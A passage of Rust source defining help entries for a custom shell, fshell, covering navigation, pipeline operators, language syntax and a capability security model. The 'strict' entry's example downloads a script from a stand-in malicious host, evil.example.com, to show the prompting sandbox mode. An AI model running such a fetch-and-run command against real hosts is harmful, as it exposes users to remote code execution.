        description: "Maintain a stack of visited directories for quick navigation.\n\n  pushd <dir>  — Change to <dir> and push the previous directory onto the stack.\n  popd         — Pop the top directory off the stack and change to it.\n  dirs         — List the current directory stack.\n\nThe directory stack is useful for temporary navigation — pushd to a directory, do work, then popd to return.",
        syntax: "pushd [<dir>] | popd | dirs",
        examples: &[
            HelpExample {
                input: "pushd /tmp",
                explanation: "Save current dir and change to /tmp.",
            },
            HelpExample {
                input: "popd",
                explanation: "Return to the previous directory.",
            },
            HelpExample {
                input: "dirs",
                explanation: "Show the directory stack.",
            },
        ],
        flags: &[],
        related: &["cd", "z", "zi"],
    },
    HelpTopic {
        name: "direnv",
        category: HelpCategory::Builtin,
        summary: "Load .envrc and .env files automatically",
        description: "Load environment variables from .envrc (direnv) and .env files when entering directories. eval_direnv evaluates direnv's environment export for the current directory. load_env_file loads a flat .env file into shell variables.\n\nThese builtins enable per-directory environment configuration without manual export.",
        syntax: "eval_direnv | load_env_file [<path>]",
        examples: &[
            HelpExample {
                input: "eval_direnv",
                explanation: "Evaluate direnv for the current directory.",
            },
            HelpExample {
                input: "load_env_file .env.prod",
                explanation: "Load variables from a specific .env file.",
            },
        ],
        flags: &[],
        related: &["export", "env", "environment"],
    },
    HelpTopic {
        name: "process-spawn",
        category: HelpCategory::Builtin,
        summary: "Spawn an external process with capability grants",
        description: "Explicitly spawn an external process, optionally granting specific capabilities. This is the low-level interface for running external commands under the capability security model.\n\nWhen called without explicit capabilities, inherits the current scope's capabilities.",
        syntax: "process-spawn <command> [args...]",
        examples: &[
            HelpExample {
                input: "process-spawn /usr/bin/touch /tmp/test",
                explanation: "Spawn touch under current capabilities.",
            },
            HelpExample {
                input: "process-spawn /bin/ls -la /tmp",
                explanation: "Spawn ls with arguments.",
            },
        ],
        flags: &[],
        related: &["with-caps", "capabilities", "strict"],
    },
    // Pipeline Operators
    HelpTopic {
        name: "filter",
        category: HelpCategory::Pipeline,
        summary: "Keep records matching a condition",
        description: "Evaluate a boolean expression for each incoming pipeline record. Records for which the expression evaluates to true are passed through; all others are discarded. The expression can reference record fields directly.",
        syntax: "| filter <condition>",
        examples: &[
            HelpExample {
                input: "ls | filter size > 1000",
                explanation: "Show files larger than 1000 bytes.",
            },
            HelpExample {
                input: "ls | filter type == \"file\"",
                explanation: "Show only files (not directories).",
            },
            HelpExample {
                input: "ls | filter size > 100 and type == \"file\"",
                explanation: "Compound condition with 'and'.",
            },
        ],
        flags: &[],
        related: &["map", "sort", "grep"],
    },
    HelpTopic {
        name: "map",
        category: HelpCategory::Pipeline,
        summary: "Transform record fields",
        description: "Project and transform specific fields of pipeline records. Select which fields to include and optionally rename or compute new fields.",
        syntax: "| map <field> [field...]",
        examples: &[
            HelpExample {
                input: "ls | map name size",
                explanation: "Show only the name and size fields of each entry.",
            },
            HelpExample {
                input: "ls | map name",
                explanation: "Show only file/directory names.",
            },
        ],
        flags: &[],
        related: &["filter", "sort"],
    },
    HelpTopic {
        name: "sort",
        category: HelpCategory::Pipeline,
        summary: "Sort records by field",
        description: "Sort incoming pipeline records by a specified field in ascending order. Prefix the field name with '-' for descending order.",
        syntax: "| sort <field>",
        examples: &[
            HelpExample {
                input: "ls | sort size",
                explanation: "Sort by size ascending (smallest first).",
            },
            HelpExample {
                input: "ls | sort -size",
                explanation: "Sort by size descending (largest first).",
            },
            HelpExample {
                input: "ls | sort name",
                explanation: "Sort alphabetically by name.",
            },
        ],
        flags: &[],
        related: &["filter", "limit", "count"],
    },
    HelpTopic {
        name: "grep",
        category: HelpCategory::Pipeline,
        summary: "Filter by text match",
        description: "Filter incoming records using substring text matching. A record passes if any of its string fields contain the given pattern.",
        syntax: "| grep <pattern>",
        examples: &[
            HelpExample {
                input: "ls | grep \".rs\"",
                explanation: "Show entries with '.rs' in any field.",
            },
            HelpExample {
                input: "ls | grep config",
                explanation: "Show entries matching 'config'.",
            },
        ],
        flags: &[],
        related: &["filter", "count"],
    },
    HelpTopic {
        name: "mark",
        category: HelpCategory::Pipeline,
        summary: "Annotate matching lines with a marker",
        description: "Pass all records through unchanged, but prefix matching lines with '> ' to visually highlight them. Like 'grep', but doesn't filter — shows the full output with matches annotated.",
        syntax: "| mark <pattern>",
        examples: &[
            HelpExample {
                input: "seq 1 5 | mark 3",
                explanation: "Show numbers 1-5 with '3' highlighted.",
            },
            HelpExample {
                input: "ls | mark \".rs\"",
                explanation: "List all entries with '.rs' entries marked.",
            },
        ],
        flags: &[],
        related: &["grep", "filter"],
    },
    HelpTopic {
        name: "count",
        category: HelpCategory::Pipeline,
        summary: "Count pipeline records",
        description: "Consume all pipeline items and yield a single integer record representing the total count of items that passed through the pipeline.",
        syntax: "| count",
        examples: &[
            HelpExample {
                input: "ls | count",
                explanation: "Count all entries in the current directory.",
            },
            HelpExample {
                input: "ls | filter size > 100 | count",
                explanation: "Count files larger than 100 bytes.",
            },
        ],
        flags: &[],
        related: &["limit", "filter"],
    },
    HelpTopic {
        name: "limit",
        category: HelpCategory::Pipeline,
        summary: "Restrict record count",
        description: "Restrict the number of records yielded from a pipeline. Useful for quick sampling or pagination of results.",
        syntax: "| limit <n>",
        examples: &[
            HelpExample {
                input: "ls | limit 5",
                explanation: "Show only the first 5 entries.",
            },
            HelpExample {
                input: "ls | sort -size | limit 3",
                explanation: "Show the 3 largest entries.",
            },
        ],
        flags: &[],
        related: &["count", "sort"],
    },
    HelpTopic {
        name: "@json",
        category: HelpCategory::Pipeline,
        summary: "JSON serialization boundary",
        description: "A bidirectional serialization format boundary operator. When placed in a pipeline, @json serializes the pipeline state to JSON or deserializes JSON input into shell records.",
        syntax: "| @json",
        examples: &[
            HelpExample {
                input: "ls | @json",
                explanation: "Output directory listing as JSON.",
            },
        ],
        flags: &[],
        related: &[],
    },
    // Language Constructs
    HelpTopic {
        name: "pipeline",
        category: HelpCategory::Language,
        summary: "Stream data through stages with |",
        description: "The pipeline operator (|) connects commands and stages into a data processing chain. Each stage receives records from the previous stage, transforms them, and passes results forward. Pipelines are the fundamental composition mechanism in fshell.\n\nStages can be built-in operators (filter, map, sort, grep, count, limit), external commands, or serialization boundaries (@json).",
        syntax: "<command> | <stage> [| <stage>...]",
        examples: &[
            HelpExample {
                input: "ls | filter size > 1000 | sort name",
                explanation: "List files over 1KB sorted by name.",
            },
            HelpExample {
                input: "ls | map name size | limit 5",
                explanation: "First 5 entries showing only name and size.",
            },
        ],
        flags: &[],
        related: &["filter", "map", "@json"],
    },
    HelpTopic {
        name: "variables",
        category: HelpCategory::Language,
        summary: "Bind and use variables",
        description: "Variables are declared with `let` and hold shell values (strings, ints, booleans, records, lists). They are scoped to the current block and support mutation with `=`.",
        syntax: "let <name> = <value>  |  let mut <name> = <value>  |  <name> = <new_value>",
        examples: &[
            HelpExample {
                input: "let x = 42",
                explanation: "Bind x to integer 42.",
            },
            HelpExample {
                input: "let mut count = 0",
                explanation: "Declare a mutable variable.",
            },
            HelpExample {
                input: "count = count + 1",
                explanation: "Mutate an existing variable.",
            },
        ],
        flags: &[],
        related: &["expressions", "types"],
    },
    HelpTopic {
        name: "expressions",
        category: HelpCategory::Language,
        summary: "Arithmetic, comparison, and logic",
        description: "Expressions combine values with operators to produce new values. Supported: arithmetic (+, -, *, /, %), comparison (==, !=, <, >, <=, >=), boolean logic (and, or, not), and string concatenation.",
        syntax: "<operand> <operator> <operand>",
        examples: &[
            HelpExample {
                input: "let x = (1 + 2) * 3",
                explanation: "Arithmetic with grouping.",
            },
            HelpExample {
                input: "size > 1000 and type == \"file\"",
                explanation: "Compound boolean expression (used in filter).",
            },
            HelpExample {
                input: "\"hello \" + \"world\"",
                explanation: "String concatenation.",
            },
        ],
        flags: &[],
        related: &["filter", "variables", "types"],
    },
    HelpTopic {
        name: "reactive-cells",
        category: HelpCategory::Language,
        summary: "Declare reactive cells with $=",
        description: "Reactive cells are auto-updating values declared with the $= operator. When a cell's dependencies change, the cell automatically recomputes. This enables spreadsheet-like reactivity in the shell.\n\nCells track their dependencies automatically. Direct mutation of reactive cells requires `unsafe {{ }}`.",
        syntax: "$= <name> = <expression>",
        examples: &[
            HelpExample {
                input: "$= total = a + b",
                explanation: "Declare a reactive cell that updates when a or b changes.",
            },
            HelpExample {
                input: "$greeting = \"hello \" ++ $name",
                explanation: "A cell that concatenates string variables reactively.",
            },
        ],
        flags: &[],
        related: &["unsafe", "variables"],
    },
    HelpTopic {
        name: "unsafe",
        category: HelpCategory::Language,
        summary: "Escape reactive cell constraints",
        description: "The `unsafe {{ }}` block allows direct mutation of reactive cells, bypassing the normal reactivity constraints. Use sparingly — it breaks the reactive dependency tracking and can lead to inconsistent state.",
        syntax: "unsafe {{ <mutations> }}",
        examples: &[
            HelpExample {
                input: "unsafe {{ $= x = 42 }}",
                explanation: "Directly assign to a reactive cell.",
            },
            HelpExample {
                input: "unsafe {{ $counter = $counter + 1 }}",
                explanation: "Increment a reactive cell inside an unsafe block.",
            },
        ],
        flags: &[],
        related: &["reactive-cells", "variables"],
    },
    HelpTopic {
        name: "try-catch",
        category: HelpCategory::Language,
        summary: "Handle errors gracefully",
        description: "The try/catch construct captures runtime errors during block evaluation. If an error occurs in the try block, the catch block is executed with the error value bound to a variable. This prevents pipeline failures from propagating.",
        syntax: "try {{ <expression> }} catch |<err_var>| {{ <handler> }}",
        examples: &[
            HelpExample {
                input: "try {{ let x = 1 / 0 }} catch |err| {{ let caught = true }}",
                explanation: "Catch division-by-zero without crashing.",
            },
            HelpExample {
                input: "try {{ ls /nonexistent }} catch |e| {{ echo \"failed: $e\" }}",
                explanation: "Capture and display an error message from a failed command.",
            },
        ],
        flags: &[],
        related: &["pipeline"],
    },
    HelpTopic {
        name: "types",
        category: HelpCategory::Language,
        summary: "Value types in fshell",
        description: "fshell supports a rich type system: string (\"hello\"), int (42), float (3.14), bool (true/false), null, datetime, record (key-value map), and list (ordered collection). Types are dynamic — values carry their type at runtime.",
        syntax: "<value>  // type is inferred",
        examples: &[
            HelpExample {
                input: "let s = \"hello\"",
                explanation: "String value.",
            },
            HelpExample {
                input: "let n = 42",
                explanation: "Integer value.",
            },
            HelpExample {
                input: "let b = true",
                explanation: "Boolean value.",
            },
            HelpExample {
                input: "let rec = { name: \"fshell\", ver: 1 }",
                explanation: "Record/map value.",
            },
            HelpExample {
                input: "let list = [1, 2, 3]",
                explanation: "List value.",
            },
        ],
        flags: &[],
        related: &["expressions", "variables"],
    },
    // Security
    HelpTopic {
        name: "capabilities",
        category: HelpCategory::Security,
        summary: "Capability security model",
        description: "fshell uses a capability-based security model where every operation (file read, network connect, process spawn) requires a capability token. By default, capabilities are auto-granted silently with audit logging — no prompts. Use `with caps()` to explicitly scope capabilities for a block, or use the `strict` builtin when running untrusted scripts.\n\nUse `caps-audit` to view active capabilities and audit log entries.",
        syntax: "with caps( <tag>, ... ) { <commands> }\nstrict <command> [args...]",
        examples: &[
            HelpExample {
                input: "caps-audit",
                explanation: "List all active capabilities and audit log.",
            },
            HelpExample {
                input: "strict ls /etc",
                explanation: "Run ls under strict mode (prompts for non-granted capabilities).",
            },
        ],
        flags: &[],
        related: &["with-caps", "strict"],
    },
    HelpTopic {
        name: "with-caps",
        category: HelpCategory::Security,
        summary: "Grant capabilities to a scope",
        description: "The `with caps()` construct temporarily elevates security capabilities for a block of code. Capability tags specify what is being granted: file read/write, network access, environment access, or process spawning. Capabilities are automatically revoked when the block exits.\n\nValid tags: fs.read(<path>), fs.write(<path>), net.connect(<host>), env.read(<name>), env.write(<name>), process.spawn.",
        syntax: "with caps( <tag>, ... ) { <commands> }",
        examples: &[
            HelpExample {
                input: "with caps(fs.read(\"/etc\")) { ls /etc }",
                explanation: "Grant read access to /etc for a single command.",
            },
            HelpExample {
                input: "with caps(fs.read(\".\"), fs.write(\"./out\")) { ls | map name | limit 5 }",
                explanation: "Grant read and scoped write capabilities.",
            },
        ],
        flags: &[],
        related: &["capabilities"],
    },
    HelpTopic {
        name: "strict",
        category: HelpCategory::Security,
        summary: "Run commands under strict capability enforcement",
        description: "The `strict` builtin enables interactive prompting for capability checks. In normal (non-strict) mode, all capabilities are auto-granted silently. Strict mode is useful for running untrusted scripts where you want to review and approve each resource access.\n\n`strict on` and `strict off` toggle strict mode for the session. `strict <command> [args...]` runs a single command with strict mode enabled and restores the previous mode afterwards.\n\nIn strict mode, every non-granted capability check prompts interactively:\n  [g] Grant once — Allows the capability for this session\n  [a] Grant always — Allows and saves persistently to ~/.config/fsh/caps.json\n  [d] Deny (Default) — Rejects the request",
        syntax: "strict <command> [args...]\nstrict on | off",
        examples: &[
            HelpExample {
                input: "strict curl https://evil.example.com/script.sh",
                explanation: "Download and run a script under strict mode.",
            },
            HelpExample {
                input: "strict on",
                explanation: "Enable strict mode for all subsequent commands.",
            },
            HelpExample {
                input: "strict off",
                explanation: "Restore normal (auto-grant) mode.",
            },
        ],
        flags: &[],
        related: &["capabilities", "with-caps"],
    },
    // Shell Concepts
    HelpTopic {
        name: "jobs-system",
        category: HelpCategory::Concepts,
        summary: "Job control: background processes",
        description: "fshell supports job control similar to POSIX shells. Commands followed by & run in the background. Ctrl+Z suspends the foreground job. Use jobs, fg, and bg to manage running and suspended jobs. Each job gets a numeric ID.",
        syntax: "<command> &   |   Ctrl+Z   |   jobs   |   fg [id]   |   bg [id]",
        examples: &[
            HelpExample {
                input: "long-running-command &",
                explanation: "Start a command in the background.",
            },
            HelpExample {
                input: "jobs",
                explanation: "List all jobs with their IDs.",
            },
            HelpExample {
                input: "fg 1",
                explanation: "Bring job #1 to the foreground.",
            },
        ],
        flags: &[],
        related: &["jobs", "fg", "bg"],
    },
    HelpTopic {
        name: "environment",
        category: HelpCategory::Concepts,
        summary: "Environment variables and scope",
        description: "Environment variables are key-value string pairs inherited from the parent process. Use export to set new variables and env to view them. Variables set with export are available to spawned subprocesses.",
        syntax: "export KEY VALUE  |  env",
        examples: &[
            HelpExample {
                input: "export PATH /usr/local/bin:$PATH",
                explanation: "Prepend a directory to PATH.",
            },
            HelpExample {
                input: "env",
                explanation: "Print all environment variables.",
            },
        ],
        flags: &[],
        related: &["export", "env"],
    },
    HelpTopic {
        name: "startup",
        category: HelpCategory::Concepts,
        summary: "Startup files and configuration",
        description: "On startup, fshell sources ~/.config/fsh/init.fsh. This script can contain setopt/unsetopt commands, set commands, aliases, functions, and hooks. The $options map is populated before sourcing so user scripts can reference $options.autocd etc. A managed settings block between marker comments is auto-preserved by set/setopt/config commands.",
        syntax: "Run automatically on shell start.",
        examples: &[
            HelpExample {
                input: "cat ~/.config/fsh/init.fsh",
                explanation: "View the startup script to see what runs on shell start.",
            },
            HelpExample {
                input: "echo $options.prompt",
                explanation: "Check the configured prompt string.",
            },
        ],
        flags: &[],
        related: &["environment", "export", "config", "setopt"],
    },
    HelpTopic {
        name: "math",
        category: HelpCategory::Builtin,
        summary: "Advanced mathematical functions",
        description: "fshell provides high-performance built-in mathematical functions for numeric values. Supported functions: sqrt, sin, cos, tan, abs, round, floor, ceil, pow, min, max, ln, log10.",
        syntax: "<function> <number> [<number2> ...]",
        examples: &[
            HelpExample {
                input: "sqrt 16",
                explanation: "Calculates the square root of 16 (returns 4.0).",
            },
            HelpExample {
                input: "pow 2 3",
                explanation: "Raises 2 to the power of 3 (returns 8.0).",
            },
            HelpExample {
                input: "abs -42",
                explanation: "Calculates absolute value (returns 42).",
            },
            HelpExample {
                input: "round 3.6",
                explanation: "Rounds 3.6 to the nearest integer (returns 4).",
            },
            HelpExample {
                input: "min 10 5 20",
                explanation: "Returns the minimum of the provided numbers (returns 5).",
            },
        ],
        flags: &[],
        related: &["mutability"],
    },
    HelpTopic {
        name: "mutability",
        category: HelpCategory::Language,
        summary: "Variable reassignment and mutation",
        description: "Variables bound with 'let' can be reassigned or mutated using assignment (=) and compound assignment (+=, -=, *=, /=) operators. Variables can also be evaluated by writing their bare name.",
        syntax: "<name> = <expr>  |  <name> += <expr>  |  <name> -= <expr>  |  <name> *= <expr>  |  <name> /= <expr>",
        examples: &[
            HelpExample {
                input: "let a = 10",
                explanation: "Declare variable a.",
            },
            HelpExample {
                input: "a = 5",
                explanation: "Reassign variable a to 5.",
            },
            HelpExample {
                input: "a += 3",
                explanation: "Add 3 to variable a (a becomes 8).",
            },
            HelpExample {
                input: "a",
                explanation: "Print the current value of variable a.",
            },
        ],
        flags: &[],
        related: &["environment", "math"],
    },
    HelpTopic {
        name: "z",
        category: HelpCategory::Builtin,
        summary: "Frecency-based directory jumper",
        description: "Jump to directories based on frecency (frequency + recency). Keeps track of visited directories in a persistent database (~/.config/fsh/frecency.db). Automatically falls back to standard cd if the argument exists on disk (e.g. `z ..`, `z -`, `z ~/projects`). Without arguments, lists the top 20 candidate directories with their scores.",
        syntax: "z [query_fragments...]",
        examples: &[
            HelpExample {
                input: "z",
                explanation: "List the top 20 highest-scoring directory candidates.",
            },
            HelpExample {
                input: "z doc",
                explanation: "Jump to the highest frecency directory matching 'doc'.",
            },
            HelpExample {
                input: "z fshell /",
                explanation: "Jump to a subdirectory matching 'fshell' under the current directory.",
            },
            HelpExample {
                input: "z -",
                explanation: "Jump to the previous directory ($OLDPWD).",
            },
        ],
        flags: &[],
        related: &["cd", "zi", "ls"],
    },
    HelpTopic {
        name: "zi",
        category: HelpCategory::Builtin,
        summary: "Interactive frecency-based directory jumper",
        description: "Interactively jump to directories using fzf (if installed) or an elegant built-in terminal menu fallback. Filters candidate directories from the frecency database (~/.config/fsh/frecency.db) matching query fragments.",
        syntax: "zi [query_fragments...]",
        examples: &[
            HelpExample {
                input: "zi",
                explanation: "Open interactive selection for all candidate directories.",
            },
            HelpExample {
                input: "zi proj",
                explanation: "Filter and interactively select from directories matching 'proj'.",
            },
        ],
        flags: &[],
        related: &["z", "cd", "ls"],
    },
    HelpTopic {
        name: "extract",
        category: HelpCategory::Builtin,
        summary: "Universal archive extraction utility",
        description: "Extract compressed archive files automatically detecting format via magic bytes and extensions. Supports .zip, .tar, .tar.gz, .tgz, .tbz2, .tar.xz, and .txz formats. Enforces filesystem read/write and process-spawn capabilities.",
        syntax: "extract <archive-file>",
        examples: &[
            HelpExample {
                input: "extract backup.tar.gz",
                explanation: "Extract a tar.gz archive to the current folder.",
            },
            HelpExample {
                input: "extract data.zip",
                explanation: "Extract a zip file.",
            },
        ],
        flags: &[],
        related: &["ls", "capabilities"],
    },
    HelpTopic {
        name: "head",
        category: HelpCategory::Builtin,
        summary: "Return first N elements from input stream or file",
        description: "Extracts and yields the first N lines from a file, or the first N elements from a pipeline stream. Once N elements are processed, head automatically cancels the upstream pipeline to save resources.",
        syntax: "head [-n <count>] [file]",
        examples: &[
            HelpExample {
                input: "ls | head -n 5",
                explanation: "Extract the first 5 records from ls.",
            },
            HelpExample {
                input: "head -n 10 log.txt",
                explanation: "Display the first 10 lines of log.txt.",
            },
        ],
        flags: &[HelpFlag {
            flag: "-n",
            desc: "Specify the number of lines/items to output (defaults to 10)",
        }],
        related: &["tail", "uniq", "limit"],
    },
    HelpTopic {
        name: "tail",
        category: HelpCategory::Builtin,
        summary: "Return last N elements from input stream or file",
        description: "Extracts and yields the last N lines from a file, or the last N elements from a pipeline stream.",
        syntax: "tail [-n <count>] [file]",
        examples: &[
            HelpExample {
                input: "tail -n 20 error.log",
                explanation: "Display the last 20 lines of error.log.",
            },
            HelpExample {
                input: "ls | tail -n 3",
                explanation: "Return the last 3 items in a list.",
            },
        ],
        flags: &[HelpFlag {
            flag: "-n",
            desc: "Specify the number of lines/items to output (defaults to 10)",
        }],
        related: &["head", "uniq"],
    },
    HelpTopic {
        name: "uniq",
        category: HelpCategory::Builtin,
        summary: "Filter out duplicate consecutive elements",
        description: "Removes consecutive duplicate elements from a pipeline stream, emitting only unique adjacent values.",
        syntax: "uniq",
        examples: &[
            HelpExample {
                input: "ls | map type | uniq",
                explanation: "Show unique adjacent file/directory types.",
            },
            HelpExample {
                input: "echo a a b b c | uniq",
                explanation: "Remove consecutive duplicates from a stream.",
            },
        ],
        flags: &[],
        related: &["head", "tail"],
    },
    HelpTopic {
        name: "group-by",
        category: HelpCategory::Pipeline,
        summary: "Aggregate streams or lists of maps by key",
        description: "Groups a list or stream of records (maps) by the value of a specified key. Emits an aggregated Map where keys are the grouped values, and values are lists of matching items.",
        syntax: "group-by <key> [list_expr]  |  <stream> | group-by <key>",
        examples: &[
            HelpExample {
                input: "ls | group-by type",
                explanation: "Group files and folders by their type ('file' or 'dir').",
            },
            HelpExample {
                input: "group-by \"category\" $items",
                explanation: "Group items in list variable by category.",
            },
        ],
        flags: &[],
        related: &["join", "pipeline", "map"],
    },
    HelpTopic {
        name: "join",
        category: HelpCategory::Pipeline,
        summary: "Perform SQL-like inner join on two lists of maps",
        description: "Merges two lists or streams of records (maps) based on a matching key field. Emits a combined list of maps with attributes from both matching records.",
        syntax: "join <other_list> <key>  |  <stream> | join <other_list> <key>",
        examples: &[
            HelpExample {
                input: "$servers | join $ports id",
                explanation: "Join server list with port list on the 'id' field.",
            },
            HelpExample {
                input: "ls | join (ls /tmp) name",
                explanation: "Join two directory listings by filename for comparison.",
            },
        ],
        flags: &[],
        related: &["group-by", "pipeline"],
    },
    HelpTopic {
        name: "watch",
        category: HelpCategory::Builtin,
        summary: "List directory contents as structured records",
        description: "List a directory or file as structured records (name, type, size, last_modified). Single-shot when run standalone. When used inside a reactive cell ($= live = watch \".\"), the cell tracks the path via fshell's DAG scheduler and re-evaluates automatically on filesystem changes (notify debounced, 16ms). Uses capability-checked read and integrates with tracked_reads.",
        syntax: "watch <path>",
        examples: &[
            HelpExample {
                input: "watch \".\"",
                explanation: "List current directory once as structured records.",
            },
            HelpExample {
                input: "$= live = watch src",
                explanation: "Reactive cell that re-lists src automatically on filesystem changes.",
            },
        ],
        flags: &[],
        related: &["ls", "reactive-cells"],
    },
    HelpTopic {
        name: "wrap",
        category: HelpCategory::Builtin,
        summary: "Clear the visible terminal screen, preserving scrollback",
        description: "Clears only the visible portion of the terminal and moves the prompt to the top. Previously executed commands and their output remain in the scrollback buffer and can be viewed by scrolling up.",
        syntax: "wrap",
        examples: &[
            HelpExample {
                input: "wrap",
                explanation: "Clear the visible screen only, keeping scrollback history intact.",
            },
            HelpExample {
                input: "wrap && echo done",
                explanation: "Clear the visible screen area and continue.",
            },
        ],
        flags: &[],
        related: &["clear"],
    },
    HelpTopic {
        name: "which",
        category: HelpCategory::Builtin,
        summary: "Locate a command in PATH",
        description: "Locates external command executables by searching directories in the current $PATH environment variable, writing their absolute paths to the output pipeline.",
        syntax: "which <command> [more_commands...]",
        examples: &[
            HelpExample {
                input: "which ls",
                explanation: "Locate and print the path to 'ls'.",
            },
            HelpExample {
                input: "which curl wget",
                explanation: "Locate and print paths to both 'curl' and 'wget'.",
            },
        ],
        flags: &[],
        related: &["help", "type"],
    },
    HelpTopic {
        name: "graph",
        category: HelpCategory::Builtin,
        summary: "Construct a new ObjectGraph",
        description: "Constructs an immutable in-memory ObjectGraph node-edge structure from two lists of maps representing nodes and edges. The first node in the list becomes the default root.",
        syntax: "graph(nodes, edges)",
        examples: &[
            HelpExample {
                input: "let n = [{id: 1, label: \"user\", name: \"Alice\"}, {id: 2, label: \"user\", name: \"Bob\"}]; let e = [{source: 1, target: 2, label: \"follows\"}]; graph(n, e)",
                explanation: "Create a simple ObjectGraph representing a social relationship.",
            },
            HelpExample {
                input: "graph($nodes, $edges) | traverse depends",
                explanation: "Build a graph from variables and traverse along edge labels.",
            },
        ],
        flags: &[],
        related: &["traverse", "pipeline"],
    },
    HelpTopic {
        name: "caps-profile",
        category: HelpCategory::Builtin,
        summary: "Manage local capability profiles",
        description: "Auto-detects and loads capability profiles defined in '.fsh/caps.yaml'. Walking up parent directories finds profiles that can be activated dynamically, prompting for explicit user negotiation when interactive strict mode is on.",
        syntax: "caps-profile [profile_name]",
        examples: &[
            HelpExample {
                input: "caps-profile",
                explanation: "List all available capability profiles found in local or parent directories.",
            },
            HelpExample {
                input: "caps-profile trusted",
                explanation: "Loads the 'trusted' capability profile, prompting for confirmation if strict mode is active.",
            },
        ],
        flags: &[],
        related: &["strict", "capabilities"],
    },
    HelpTopic {
        name: "setopt",
        category: HelpCategory::Builtin,
        summary: "Enable or list shell options",
        description: "Toggles shell behavior flags at runtime. With no arguments, setopt lists all options and their current state (on/off). With option names as arguments, it enables each named option. unsetopt is the complement — it disables named options. Changes are persisted to init.fsh automatically.",
        syntax: "setopt [option ...]      unsetopt <option ...>",
        examples: &[
            HelpExample {
                input: "setopt",
                explanation: "List all options with their current state.",
            },
            HelpExample {
                input: "setopt autocd pipefail",
                explanation: "Enable autocd and pipefail.",
            },
        ],
        flags: &[],
        related: &["config", "startup"],
    },
    HelpTopic {
        name: "config",
        category: HelpCategory::Builtin,
        summary: "View and modify shell configuration",
        description: "Unified interface for viewing and modifying all fshell configuration. List shows all settings (options, prompt, keybinding). Get reads a single value. Set updates a value in memory and persists it to init.fsh. Reload re-sources init.fsh from disk. Changes to keybinding take effect immediately.",
        syntax: "config                     config get <key>         config set <key> <val>   config reload",
        examples: &[
            HelpExample {
                input: "config",
                explanation: "Show all configuration values.",
            },
            HelpExample {
                input: "config get options.autocd",
                explanation: "Read the autocd option.",
            },
            HelpExample {
                input: "config set prompt '> '",
                explanation: "Change the prompt string and persist it.",
            },
            HelpExample {
                input: "config set keybinding vi",
                explanation: "Switch to vi keybinding mode immediately.",
            },
            HelpExample {
                input: "config reload",
                explanation: "Re-source init.fsh from disk.",
            },
        ],
        flags: &[],
        related: &["setopt", "startup"],
    },
    // Additional Builtins
    HelpTopic {
        name: "string",
        category: HelpCategory::Builtin,
        summary: "String manipulation operations",
        description: "Perform common string operations via subcommands. Each subcommand processes input from the pipeline (if present) or from positional arguments. Results are emitted into the pipeline for further processing.

Subcommands:
  split <text> <delimiter>    — Split a string into a list of parts by delimiter.
  trim <text>                 — Remove leading/trailing whitespace.
  upper <text>                — Convert text to uppercase.
  lower <text>                — Convert text to lowercase.
  contains <text> <needle>    — Check if text contains a substring (returns bool).
  starts-with <text> <prefix> — Check if text starts with a prefix (returns bool).
  ends-with <text> <suffix>   — Check if text ends with a suffix (returns bool).
  substring <text> <start> [length] — Extract characters from start position, optionally limited to length.

When piped, the text argument is replaced by each line from stdin. The delimiter/needle/prefix/suffix is always taken from the second positional argument.",
        syntax: "string <subcommand> [args...]",
        examples: &[
            HelpExample {
                input: "string split \"a,b,c\" \",\"",
                explanation: "Split the string 'a,b,c' into a list by comma.",
            },
            HelpExample {
                input: "string upper hello",
                explanation: "Convert 'hello' to uppercase (HELLO).",
            },
            HelpExample {
                input: "string contains \"hello world\" \"world\"",
                explanation: "Check if 'hello world' contains 'world' (returns true).",
            },
            HelpExample {
                input: "string substring \"hello\" 1 3",
                explanation: "Extract 3 characters starting at index 1 (returns 'ell').",
            },
            HelpExample {
                input: "echo \"  hello  \" | string trim",
                explanation: "Trim whitespace from piped input.",
            },
            HelpExample {
                input: "echo \"hello world\" | string upper",
                explanation: "Convert piped input to uppercase.",
            },
        ],
        flags: &[],
        related: &["replace"],
    },
    HelpTopic {
        name: "pwd",
        category: HelpCategory::Builtin,
        summary: "Print working directory",
        description: "Outputs the absolute path of the current working directory. Useful in pipelines or for scripting where you need to confirm the current location.",
        syntax: "pwd",
        examples: &[
            HelpExample {
                input: "pwd",
                explanation: "Print the current working directory.",
            },
            HelpExample {
                input: "cd /tmp && pwd",
                explanation: "Change directory and confirm the new location.",
            },
        ],
        flags: &[],
        related: &["cd", "ls"],
    },
    HelpTopic {
        name: "echo",
        category: HelpCategory::Builtin,
        summary: "Print text to output",
        description: "Prints its arguments as a single line of text to the output. Useful for displaying messages, debugging scripts, or feeding text into pipelines.",
        syntax: "echo <text...>",
        examples: &[
            HelpExample {
                input: "echo Hello, world!",
                explanation: "Print a greeting.",
            },
            HelpExample {
                input: "echo \"The value is {x}\"",
                explanation: "Print with variable interpolation.",
            },
        ],
        flags: &[],
        related: &["pipeline"],
    },
    HelpTopic {
        name: "type",
        category: HelpCategory::Builtin,
        summary: "Display command type information",
        description: "Identifies whether a given command is a built-in, an alias, a user-defined function, or an external executable. Useful for debugging which command will actually run.",
        syntax: "type <name> [name...]",
        examples: &[
            HelpExample {
                input: "type ls",
                explanation: "Shows that ls is a built-in command.",
            },
            HelpExample {
                input: "type curl",
                explanation: "Shows that curl is an external command and its path.",
            },
        ],
        flags: &[],
        related: &["which", "help"],
    },
    HelpTopic {
        name: "caps-audit",
        category: HelpCategory::Builtin,
        summary: "View capability audit log and active grants",
        description: "Displays the current capability audit log — a record of every capability check (granted, denied, or auto-granted) during the session. Also shows the set of currently held capabilities. The audit log is bounded at 1,000 entries.",
        syntax: "caps-audit",
        examples: &[
            HelpExample {
                input: "caps-audit",
                explanation: "Show the capability audit log and current grants.",
            },
            HelpExample {
                input: "caps-audit | grep denied",
                explanation: "Filter the audit log for denied capability requests.",
            },
        ],
        flags: &[],
        related: &["capabilities", "strict", "with-caps"],
    },
    HelpTopic {
        name: "filesystem-capabilities",
        category: HelpCategory::Builtin,
        summary: "Explicit filesystem I/O capability commands",
        description: "Commands that perform filesystem operations under explicit capability grants.\n\n  fs-read <path>        — Read a file under capability control.\n  fs-write <path>       — Write data to a file.\n  fs-readwrite <path>   — Open a file for both reading and writing.\n\nThese are the low-level capability-gated I/O primitives. Most users will prefer higher-level commands like ls, ff, and replace.",
        syntax: "fs-read <path> | fs-write <path> | fs-readwrite <path>",
        examples: &[
            HelpExample {
                input: "fs-read /etc/hostname",
                explanation: "Read a file with capability checking.",
            },
            HelpExample {
                input: "echo 'data' | fs-write /tmp/out",
                explanation: "Write pipeline data to a file.",
            },
        ],
        flags: &[],
        related: &["capabilities", "ls", "ff", "replace"],
    },
    HelpTopic {
